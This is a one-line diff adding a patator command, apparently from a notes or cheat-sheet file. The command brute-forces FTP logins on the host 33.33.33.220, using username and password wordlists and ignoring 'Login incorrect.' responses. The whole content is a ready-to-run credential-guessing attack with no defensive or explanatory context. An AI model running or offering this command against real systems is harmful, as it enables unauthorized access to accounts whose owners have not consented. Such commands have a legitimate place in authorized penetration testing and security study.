@@ -1,0 +1,1 @@
+patator ftp_login host=33.33.33.220 user=FILE0 password=FILE1 0=user.txt 1=password.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
